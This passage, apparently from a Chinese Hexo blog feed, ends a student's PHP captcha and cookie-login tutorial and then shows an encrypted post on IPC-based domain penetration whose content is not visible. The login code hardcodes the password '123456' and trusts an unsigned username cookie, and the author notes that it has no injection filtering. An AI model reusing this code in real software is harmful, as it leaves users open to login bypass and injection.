variable">$height</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$color_border</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span><span class="token number">100</span> <span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$width</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$height</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span><span class="token number">3</span> <span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">imageline</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$width</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$height</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token variable">$width</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token variable">$width</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$height</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">imagettftext</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$color_string</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'font/HARLOWSI.TTF'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagejpeg</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>注册输入内容后点击注册(submit)，在phpmyadmin中可以看到插入的数据<br><img src="https://img-blog.csdnimg.cn/20200907111841543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>还有注册时间。</p><p>登录<br>基于cookie的登录，登录将生成一个cookie，</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$username</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Location:404.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//跳转到指定网页</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'cookie设置失败！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'对不起，登录失败，请检查您的用户名或者密码是否正确，注意密码安全。'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>一些部分不是很完善，之前还想着加上过滤，预防SQL注入和xss之类的简单注入。但是，没有扔掉这个HTML，所以就比较繁琐了，还是自己写的HTML可以，但是太简陋了，最终没有换。不过需要用到的知识差不多也都实现了。至于登录成功后，就可以加一些自己的东西了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>验证码是之前就写过的，这都是之前让学习PHP的时候前60节中的内容，所以总体来说不是很难，就是对我们这些小白，可能出现最多的就是连接出错。无法插入等问题。多尝试几次就可以了，报错就一个一个查。<br>最后贴一下我同学——奇点写的博客地址，我们有较多讨论，可以对比一下。我们写的格式不一样，有些细节我可能没写到。<br><a href="https://blog.csdn.net/qq_45869039/article/details/108380902">https://blog.csdn.net/qq_45869039/article/details/108380902</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 水文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透———基于IPC的远程连接</title>
      <link href="/posts/2dc50a02/"/>
      <url>/posts/2dc50a02/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="Hey, password is required here." /><label>Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="568575f716eb820a440df044707031c2f3c0423e47cc92daa3d2a014017ee852">0f88500b8e733fc211e7587570855b879245c874ce1a4c114fb3fa90043c02f7f00f7bed944e89c386d36e00c3019bb9bb4cbf9dbcee4f69a4d35e8896b02e14535e4cfefcfda3443f09d0bc474149a3d3bd9b0aaa0da3505a63d61a4dbc1827b091a0503142c14740f5fea8ef619d23aa4eca2fec9b3209b3e162c1115c38a1164fe52a48bdc6fa7ab6ff7cd43dabc3982194e0b970d4dde36e1f74e2d34f072ada2d83aedc0119608a7b9ffe284460cb7c0e6ab4c62f6480c22732ae1a879fdedeb1bac63dc437d57b16038276d7bc1d3c835fe0e3cde0689a18cd050d6464b280b613937734ba296e56baf711d9f8e33a4ef2cec772d53930d01ac9f27bdbed20e3750f9cd8c09b226e0d7c51972ce0f90fc70cbda482560a14fb9af1abe8ec15734430c50260d8567b4c43d7cf816bd6f1e7e6ab7488e75180445834c4b2b74b013b92989b2aa3cf6487a1d28826ce1ae85b9f5ce9e983603b9084c8957633531f4db3ca832db9d998fa780df00ea71e337e110f94b62d0eef708ac6a8cffeca9256472352f885a3c5763d4503130443a4285535c978cca95d8e1a95f7c0c5b24863e7d411d40b11313c804e57fa2203afa3a368423abe2efbcd5da4e4fafa50abcbbd8e9c47093e9e691a24e0dc1078f498f5b34e2616cbf4cae68383b74cc9f660030d8d3eb9fddd71e980a2a4a65401b305e0d2459c12acd08a43f0e5a6a7e497b86c8343608bd3bbd94f2d99fcb84332d50b3197f37024fca8cedfd320e0f82d54a31f391f1f59f72425a567dfa5479d461d110d2a2e0cf69c444b2dd6ef935d44cb4c2ccad2df5826bf8919f2ec6b7d306d8ebfa71e13dd870c2933b6a7323659b2f9c81bb72666223f1ddfd5ce8e6cda3b1b2c51c1025882ccf0577e7166d8b917ff07f940d397616841d692d0cd7257642d819d30fd8a5769fa02bc802f70a3fd255e568a54f00e06848bab430572bf7f83dd7e063d0174fbe07f147be08c756ba010000e5af09a310a355a5cc844dfffc2b041b2d3c35b3597c16705f9f54f70df5c8cba51affd424c5c8a2c7c0acdf8d6c199ed2cee27823cec4ad6113b76f2dbbca4146b6d54c815b64a766da3f45dc8a691562bf6fa4684f69b9f17514c0f81f80fcb434962d6d6f1149c55988820e8cf9782f2d50d980062b09a050e2d37dfb3519b2894dcb8abd798ab9c3f189c9a627d2ae3601576255b439cd01ae449c2f414412ab59f668b929829d8de38b7997b9180e4cad155d8f3671aee1de51f92dd02e28d5b568afa8571813c91aa3b70650c79d7c5f8d0a924fae77b8c6fb148896a8ecaf406f55820500e009e6ad7e919db63bf2450b6a695417122f19927fcd1139d507e43553c6afad16847db5570512033b19086b4743cfdb76e4559772c4449a7406be65a4990976ca679f7b06cb226602af643b5e55ca458da623ca4d003a5e511feb179e45866f7a58a667756817886ce0181c489914b1b9ce988fad5a7d0a5441629d765a59bdf1d12b4eb0abb2469432034492de46f1866ccdf028dcdd45d1261e4a116cf77f639f5004b4df360a053eed5d83eff7a3fc76b0dce713611f6e9d8bc4bfb75904cf3ab62ba768d2200edd0fc93f84e1f9cc6ec36fe0fcaa6ace1f3e875338edfc8eb76513e07b699d12072a1bfb95d2f9a443a6d5036c12913e63c944a62ddb64724f3d84347cb6e1d3261104087b5e30cca73c45618a376bb2cb31be0072dc0d20f07ebbf2a451a23662040eb216a9c072dec6de68e34c31c3bb3a95a321e9ea53935b14c8f46d0f118e61e84d1b14682c8f688d0d95f1408d47a68e83115d826289d3c4dfcab684e645c44f582028cb7a27e48f3081a1b713d81794de40c9e98608e9bd98c54f46a0d57ea526d33ae006378310f8e9e546663000b242fc0e5c76fd2e52d9a4d534b6a9506b8c86a37a2112f0cb0249eaab3f634f0658ac36812c97106c047b34df4bef4e985c7eab267224b0e31dfb5abf4d7f5e2509e49a42c883f7ce820251fc50bae51a7cfce652bd04571a872490e8cf7e40f134e3e6716c2ad6bd42df9557d9c4cf2f641bb6ee06a5571d416fa70b5e98df803824a64502ff5f768dec07e3f1d9a2b5e73efc212cb95b481361b835b7ca08770dca8d874f9ebef1f6b14b3d7fd69cd34b7d178f8cda05f3ac32943fff5e284470b73bddc327260ee93d0ef11285b067bab76a9a3cb88920f7e37f42f9b8f70e486a85ed2b7571e01ff0e1bece0f66e103fb4307394be669b1400073a5497189cf0d647199f15cb610d5d66b8dcc88376c6b916d743e52adf91843061f51cdb045a1811ef8ac7aa4e2eab197bf5ba0f53711af2e5a32607b4ca85ca0c7ab4b213db4299a422266c3c6121dbde6d7db2d787e66bb86142ef50cce808c999d3707e95c4512452e9c946cfd173a1b867d779be12dc127f8db898beac01a2d8b78ec13a8501470aca505a6ca7a651f6a34ad5d49140be48b572684e7f885fdce7b0d8c673629403291862d81c75f65848b6097afcba2fdcdc2dfe7d5796a1cd01ce110f6ae60b7243da1937956eff93a5bafa3219623ddbeecb6a01dfd26bb05fb7686ad116a3e8ab0673d49c225f63c8f5985294b1adfbb55e1ccd4ddbfa602b7f69f5002cd0e01b5687f41a9dac7e9fefb75fb95fa21f92af787be5c79c18dcffb6e9a805e975133a9700397188f7c6acea5549cf56f417c089908a6e8c79bb0a2cbe08f3d07d67341eafbcc0b5e61ca94f405d068f3fee011ddb209bfbc462faec82b8cdd678b0192c88307b58cc1b25ff1d147b220ff0c61875a3f58c7c63da5e81ff5aef44e837d4ebdc8836c719fac87cc60ffce13b3669850c19948df4eb17ea670c4a01e8029164a30f45378db628a6941fe7fbc322dd3e045b62b51c55521d41b14e6da122b2af6a77d0b910b4e21b7c43aeed6cc123c273fcbea1cef1b227993d3fb75c66fe3e096815bd61effebb40eff614a5a8ce81747790fca8d45c191d840b0e2fd85392e9f61dbdd94c017df97b40ff23db5d4c745f74b1ea1880ebe22ea1892e322f20ee50d1a8f91991a92fbd9d085b38af7a6960ee31de4f95bb96cee2fca32b0e2b9416efcd9453c659bba4a2918f4bf164196bcc0c1f0a2f02cfffafe70754922c0acb62a9e73b889dcd3d7007c15d08587cd9373adf9f5ff1dbf8f7f241dd082d1fe995c7d2e33c8f8e7ab77432e0d77c6cd78891f79cdf71446c4df44943917f9aeb0cb000307759c8f04e3f6fa15a23ece2ccb84d5db050c042f030aa4493ca9f68ae2adf5e65bf3d7f098f86548e99d41320a279fd70e6cbe0c1e31b510aa1594b33180ba061d69419f1d12fb7fcee2b36ea8f526341a1558adfc5d625caf144fe2de489f40707c584790f1b891fe00d3059e79d2db560d3a0075d3b45d05eee7f70c2f35e7acf7341bb297527d13498380845389d603a631e54d25c2f922617a08c1b3e8905d6b6334e37f5f12e099a9db47feb1659a2865b15a285d4a363a06a0e2c9ebbb98765adf5d94465230fbc14af6d9db8d7b6219facec1af98b9a6db55f207c0bead2c508ee6fe0cabd6c0d0afc685856d07474aeda378faae564af546191ffdf77549fd3d528dde6d2f4ecd54fe9bed9e8f3241f37ffde77c0c49dfce572ea2cbf885030685db76a596eb1b441bc3f6d9a7116a26796e387f608d6d9121a02a9c6dd7b9eba729bcd212dd92302b1ced533300eb97853ed828c4e2c318b9e17d6ae818d1280628cd19eaae876b0b18182e04e3517e0c1dae351fe9b5c97964057812dd0c7cbf80ce3716c7e4f379ecb95cd837f767fcdc79ceeef2796431bad81b68f3515b271274cdff71a248a93251b67a513d138d3a703b24dbea75d377460a78c213020487d243782725f5406d8ddeeb05f8bd0fb70dcf319530e92b995077d9534ee13272a63550ced26c04b1ee4ed973dbffd532e48d893a6bf53ef2b0eb8c4cd98742b51f0f991d18e5c8a3fd71966fe780bbe5c24a050cb697f527729319be1dd02aebec6a97b08593536717ebdc64ed4c42a692ce496b46db4bde80576877dd2aa759aec0a674cbbf5d05dc786cc23f46abe641832150406e53231b5147180ef99731d18da9b4a848984eb495b5e4b27a1213541bd1a1c954770c9413910e0795b3f23aab74b223370856d7ff21c701bc1c273e22cb7da06f7be17bac57b9182ac6600e71397754eb40aff8e1dcb0f203f92868ccc199f0941a6bf2aa402a5095afc986454c7ccc70b76190cdbedf75dfd495c14cacf2a952fee78f9bcf4f9c2eaf66101c5b04d859e9432f7f2d026e769e71fbc496c07e444a70ea0bddc2ba72d58020b8644f7fa53a247adc690ce86dcbfa0de09a21dfb461dd5001f3be48a5f6dc2d252324cb2d9511b83dea6efcf29b53815fb90ee722a22eb03b2bf504f14d3cc62d70231444a7aa4b5aa78074567f2bb4b20e70dcfb9a416c1466d75bb9e589638e6e623b484c15c8e599d4be9c76aacc5220fd4155b59fd297d400e60e2e32d13fd05d13c2bbe359ddeff4d8fef7b58c228efd8412c4622cadb4d681eea6069b6ea1ce5a384fd402200bf955d8d2767e96e01c9dcd75e8a74ae4c17fabe369e354f5dacb8bb6735436d3b7e14e8405a1b4359e83ef1be12a924f30c3ad4ecdd0cb4a6732adaf3a18dc9cd77dbe42e59a463abfb01bae1d44b668c39265753f367665140e9c72fb89d539485daf7f48487b98d4c6924c7a254c07ff1854b9b12e8ce4caaf50e29b92938bd9335fb30c21e38ef41a327f5bc2ae3a3c690d07658c81dbab647bcf26ad3e0d37e458759927643ee2dde60e832fa582011aaacef51d7ae7071271934ed1a4622af079d8263ad803cc56e379974a05ca6ecfb4b1c1d1ca9cf30196cd6fe455823b184f52612a1aa04e92fd8e8446719ee1b81efe8c85ba15e7e6bc9103b57c4f449e59bb91af58f0b5bb36d9afd0e4a6e1706873d1b4dfb95a59799066fb4e120d7480ca578cadd1d7f965c50137e6af662c747d5687264f2dad51dc4e5342f0597f22f39ff22e458aa74f21ca91833e6d55496ec1212a24fa578becee94a6469d4e58a6e9ff9386adbc3e1354b4773e196cff005477e73083d99667d5aa24329d85a8ddc21c5336a62a3ce88e794b2c8a580f7afd9d18e96405c9de608d8dd751012ef2cad84603b515874fdfa88fc5918e9913375661a568c36c7aebcbd2bc24f36d221ed1e45a22c7bf4a3a6f82c896f7a47f95c6d35cc8cdc5bb67b7167ec43bc579f7c1ff0a86a42f03c1f30af1fbe126a1ea272074c0f31b0aff13e17366aba86cbb01ae85816c61ccd4baf6ff1d9f8056442b048efd2fcb483aa51beef12f814e39cae0de2c555afd8ff6127cd310ea2efa07a416e22ec948d0bec39e8bb380122993ae2f484e95b8d99862f79cf29ca45b5c609d745edac3ffee30cd2508c73387d0fe148ca80e1b10eab30e3b0167cb56927d110678c28b273c2557b5d65fd3674f24176afd13c270a78d328f2eaa867c7b6de2e0a3801ccba61e4b25ae2ec5c1fd367898ef7ace3cc45a928800cd6741ff088a1ab99b5373ca25c4de9ddb6706f2e91bdd51ffc335a978bf215fcaf5a439c0c08e401e7ea24afa0cdb35e6a508978d15d9ed9756d195e99e7cac39668a6279141a4999df2a1b8bbefa776fcd86422137a8b59cbfff108fc5185ed7cd4ad2b0bb6a9353fa2186a671c8ae6b982846c43bad5f696f964495f3dc9fb132126a25addc658ad40c76ad6c1c07160dcce59a5fd9db258c24a15c16df65aa060980792590d2e2a6f007e9c0e7ff491c2401da226433e2c26ce75b93da2887e12e9e20f5b7053217593c55b421704cd2e2ff2171c40dd04c1507475e5db4929ed3f3927f3a1df25eebf0c67eda6505af3c6dd6276dd1e05d972813518d6ccbf42c0e65d8968bd9e3a2ea0162236b5b9a91934a5dbccf4386a3fd449a8fd2bf2e52f06cacc726b9012b58ce9a1e8df171e102854833c6f536fd72a3d51a67f1884d7c9b980ee41b7027f54774588671c95d726f10c467276afacc18f5f3404d74fd419851a22805d6e37f57f26d787e1a86055bbbef5d31f8932500d35a86bfeb46202778b69016ae30c24a4ee06b2ae9a9b05aadb628f71d63df3949baeae1dbffbfcfb9ac4b7d5098138d56d3aa3da7a41e360f1c6d22589905a30f0cc426eb387d472229fdaddd06c1e87471cdc156b8edf4f72f72ff7fa42fa2c2c5547db7be30806b22c56c5c38c2a87a959679fab977aa17e58d9f99399110866c710b8098d9a512c7b109cccb31aa678bb145ee4ac6173dbca24148f7177f84cd53e3323afa688b468165d2e094bd0691374cc5197fed524c5e2977171931e892c772a5f0f720ae0956b8b1ea477f55bfea390711606de1c54f249ed96b4732bad0300e5bf084598729aab7cb2f2cbb8f6b8a0b16a34141d90bd953e3679b51d4efaa23763fc3efd6283f4190d2926f808d53afff951605d24457c4ce2146297fae63b8bef2c7c86a55ff5f3581d5ebba347f33be250f7b8f7417a442c7cf94f8b82e0888af93fc766e8fa3a4e20f6a2685700547b1b8e266152ad7e53b871986983d8e4262a932532960194b4fc72f7a17cbb3fe5ffc2b1d55b1fdacce85ef8a6e6f6b3f390e92a363dc31cd829ef7b2a6b507977213b19279677d435a4ef740c84be267684d21c1473ac92e7581c9382b75e94f7f09d61dae50db6f248e51df9ec20ba4b3b39cfe735d2df1df6a6476652814c7a0b96bd0df87a972e2c18f53c383a7a929db5989ac85a9c06724b076a5c4ab776a64c7760a739987ec7f1f997d30806dfa7f2c63265df034b9dbfb69e75845302e07c7649500d0bededee3dab3c569c8ee082faa0a9b4c97c1977bff0d38249a897dff5610dcf84ca37a676ba313014078dd174b538d76e2de1c37de100e3d60b403015fc088e134eb8fb9d487eae96559891a2322164caec3a6b32ebc18dd25ca8e54444bfdc6330ab3fed32e7b296c3075febe41098c516e5ecbb3baa7622a52fd7fdf8a721be998b7f29e870bb7780432de6a7d924d53ae4212b3ba284c7f9fbcdf5d15456c818648f1ec97db67f908b7ccc25b59f75eca7131d76c21ee373861a577527c8b54fc026c341d6a05f837ba757bf20704c8752e1f364c3e356ecc9ff295e10e88d962053069d0933a5627c5cb9b74bedbfd02368fbef4acf42c5ff2d911f2260835dcebfc10b0a3ad677d320bb87e2454493632d4985712df38fd50a9af5c5e62143786bcf11dcdc1d196b7c659a33807f7721c83a47d3cd04041e9fd9801a8f39a8b8cbb06bc4b2abf7695b362c8ab25670afe8bb75dd78a0c11b0a14cc22f415142eb9c0d85d827cbbd5be69a6782a0b2a9a6320ab4c7b34f9ca3b994238112138811a08f758d30dac7a1ed62348b23248ef279baf62fbf769bf755f5767afc366e52e223656b4e1174c9cea165c13ca07cb66d12085bdc388e9d6f3475d097053b11d4640a4b48efba4546dae67b305d49c31a4e5c39a7136332a17c95aa7e5c564242a647361fb67cf89a832fade393d1647d9c9ae5e417f0e895562cecbca6f0a44adbc2c61da1aef0ca45258ae4b7556bb343ea38864df21d9d26ddcceeccb3d0ec096e92e281985032bdb8adf3801c1729210c7461074e8913e4c5e9785e24a0373fde177b4750ef6ed0cb3259720c51d664cc4f0a9715f92e76488a5c4cddc88edd7454bdf863f4bdf8d0242e280e95841b13b1749fcae1379a2ab933091500b258492c7fff484f91fc63fea2ffbf393cbc31ae32ec5a980552b28aa1bdf6ad76b1a71b2bc355780facfc4d2daa629c45d95ebf4063d3735e39e4f21a14886e22ee57762a69a1ced2e4018f863d2a0c0c95b74f239d0731c4c41e586453a899112745735b544b54d19b8add650fdef322414cbe7d29a1e9155b2d2e21e258014f4ac63ba89c13850d4ef12f1822943b70d520bc2473a8af53ff1759e666d24277660658b784a708cc89eb692d519a98f794f8615dcebc89fadb24b712315c0db95f43b2e6a932f88cd5bd3e1816aefbe0073fda32d1ec938b9db6d79d1682a4ed6a677f1d5a6414e84a21b7b957d0393b50a7e3dc8c8db5bd75f97a63416489f424fa07304e51a2db505f9e54d016f4db84cc51c716535903bd7fa5ee60f5686e5717651c4f3c69463989d49d6594238f63c4a54375822f12bad942c2844b1532fb998a3342be6ba2af66e56553ed8fd3656c7b8be5b5326a1e682fe8abea23b7c4fe34372dfc98b829e419678fc75698e2af04837942e6d61add8adb2e07d209145b3533f0bb7a229fc65f890652c1acdce85d6b511ad10cfa8d7b87be39be168a537329e2e50e9da704021c668fea374c102e6b8a7b4f6ba4da612495d9f724315746f0f46ffcd2eb66e97f8f2b28fbdba3cf68845fb09fc8f699689ea88d2d2aa5b28c7eb398575016c567d8003a941ea5ba896538a3756751b15efd5e4bdee17f7e3acf7075af7c7e0839ca46bc7cb3efcc6f63fcbad1e1a060d89ea9b75d9a08e0da655aaf0d8c19f735392504c75c394df889b2e85ff538c9498a1ed914e15cdd4ab8493e2998a958f63af0bbd4a953938f3d7892dd2ded3a7b8cf054aeae208d61531c05e88080d7195df0a182c56e61b30bc39b019d493e69747c8e83a2092dc06d4563893a7446066436d5a36e7653b5c17c0e8c81c3d15f0d41aba1a03e7469c8abb0a9274e09e7cec56f4ed6d81159d706c3bc96a60e614ac67709a832318589b5d20fe9446a7ff26d1fbc7722e0f987582fc0079b275c6076696f2d20a31b395a00be9254830b3c9f4f1a634bddc183faba4f6a2c13e10cef9aeacd1c4aacf066cad75ae8dde617fe40146ac02f8febca40c345105272f61c50b817f64231106a6f38e0907314e424e9460ce04ffabc6cef1e4edf279c8ec1e7272f099777819a56c9e4169973184c53aef71eb980de85b7141a93b8e73ea803034501397a7d8dc6f945723556655fb4539e945d2fea1898a6257cbc62892cbaa3851580210f534eaea8b756df65ae65221ad975cfff36293c5626860973805d3df955bdc64c6bb9f996f03bf3477a613084e45825bc32a8ba5e0e5cf6611e24a4b2b009caefd3805ea74b658dab039802259402a7d5e870a18c705cbe1b72e9cc2a1b3cd9b4049d17a6ad9d910f5460fd09473999faa95d736304fd080b73de13c3b36796b65e2b76ccca97c8c5eb17c33b65b9804b06b9dc4846a902cde4822d555ac463435a0a89aa8efe71dfad30d0af779eda6a18b531fd73c97a94daaaf3c06fb514be681f9dbc3172101aacd87e50d8ed4c105b1f52d0ca4c4827a47b34d8e08e7bffecbd967e9d78302936a532cd1fc3d53d06606f54b6f87031aab606541158c62efc122a2fea42dbae9fed56c72c6cf384b6903ceeae47a1b96ddecb49eefa7266d7f73194788b6c53d3dd144c93e41f4bd1a36924ba8403b21968d950d627979af0f2c6b5aad3c966461bc54b8184e518b09567c2794485d901f44a66776fef5e32c16fd38b351294b252448b2b71562a0a3f1c1b52097b949c22bf324255fc754110ca0e467ff765bf3db98a15077a927b26defd22baf4a864557f731f927d23b3fde039e2be3d77a83ebef704d05f4e40e53241e638208967a1b36c8a9f553f348e412bcc71225b9856eb4e5bb515f5c655ad5c400d8dff8113888e0a183c32bd2390e533784f363e704c868886f85897c5e7d6fbb48d56c71f3f33c64a78f60c3859ae4f60b45666e6c4da99ce90ceede26b2eb141e9489a0f7dca516d6b57d5b9fe3c2c1bac74dbee5380784d8f644408497d981c8083ddfb967756b998518963a2a6c57dee72c9d9ed279948ae28336dadb581bd5127aba6704e132ed4dbee96b805d7120e61bc22fda0c3a3fc704f51b0d065996b9fb39695bdcf992127183178c77df6ab8714b3b1991026c12476e43e0f1c170865de7f945c23b35909ee79c324a318acec63d1496953b9e91820e09a2efc97b1abe736606da1c2d8ff5199d1ff815c6024270ea8e387320c1fd939556367058c1a310214b6ae1a22e7a3c79ef377425a35cc6fa26b31ffafbe18cbfdba4ef3c1c72204182d64575b8f2947bb42e562856c5274b26c8de97ef6586e79f9d326f97b1df67efe26676ce792a8ca422c1f147ab4e6a6ca7d743d024094d6878fe904c033e8e9e244c85b515849f4bbc8dbf0025e7ff648cc4ad1f68ad1c75d2469f7c154216c47ae9652b3d663c52aab668a2a607ab843ba3bce2a630e0ef7e5b422c7e62959c8ae9467fc96c1c57c9e1cd011b4df7a36d529990b33cc543ea7870b6bce308af5dcb630ee3df949e347471beaf422f6a995b513207d9293d9a7431356d7ffb09586011e762a7b798f56408e5d9a13056c593592d6b1669d0e2330d4ad6a419adb9d207f82d2f3662c4c345ee0eed20dd98f2e57198b126e285a9ca2da5623c5bc66103c5757f605380f2619f9af1c8045bce6ce6b9272a9f1dd5964ff8f7db295fb804222ec0b444a35d64d066ce3ad1cf70d4ecd29185f62cccdac446b87346aca40a6a99b5de840b7ec4e3162e3bddd494c9520a15eae26c5995e3b5eb020f1d8a56788c3f2e91751efc0c950da03ac5b56747de746f50bcf52a62b9ab4b827b98a5840f9c67f1e6fabd31dbf632017485ebc6fc9d3fd8ac48b8a0b126a4e980fcb59deac3030aa083d360238197c803a96d50a59f9a1a69256949a26d286b7bf42bb863eb24b89797e26d89b9e57e13172181b880d2f5a414a7e602f37eb9aeb586cfd1292132ea56eab55d975710162354827f966ab69de0c0ba204a35c931df54559f5874fcf3c6b39035de8d9c7393e9ab9d300b58171a553d1be79e9d9060db9d1919de2f05bc588c578e6c7e2a4abf93b9cecff8bbb757d900d455be8c6a9be972ca5ec4ef411bf0d62b77908ac08d02419bc